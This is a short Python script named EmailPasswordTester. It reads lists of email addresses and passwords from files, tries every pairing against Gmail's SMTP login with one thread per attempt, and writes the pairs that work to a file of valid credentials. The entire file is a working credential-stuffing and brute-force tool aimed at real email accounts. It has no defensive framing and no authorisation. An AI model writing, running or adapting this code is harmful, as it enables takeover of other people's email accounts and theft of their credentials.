import threading
import itertools
import smtplib
from email_validator import validate, EmailNotValidError

class EmailPasswordTester:
    def __init__(self, email_file, password_file, output_file):
        self.email_file = email_file
        self.password_file = password_file
        self.output_file = output_file
        self.valid_credentials = []

    def load_emails(self):
        with open(self.email_file, 'r') as f:
            return [line.strip() for line in f.readlines()]

    def load_passwords(self):
        with open(self.password_file, 'r') as f:
            return [line.strip() for line in f.readlines()]

    def test_credentials(self, email, password):
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            self.valid_credentials.append((email, password))
            server.quit()
        except Exception as e:
            pass

    def run_tests(self, emails, passwords):
        threads = []
        for email in emails:
            for password in passwords:
                thread = threading.Thread(target=self.test_credentials, args=(email, password))
                threads.append(thread)
                thread.start()
        
        for thread in threads:
            thread.join()

    def save_results(self):
        with open(self.output_file, 'w') as f:
            for email, password in self.valid_credentials:
                f.write(f"{email}:{password}\n")

    def execute(self):
        emails = self.load_emails()
        passwords = self.load_passwords()
        self.run_tests(emails, passwords)
        self.save_results()

if __name__ == "__main__":
    tester = EmailPasswordTester('emails.txt', 'passwords.txt', 'valid_credentials.txt')
    tester.execute()
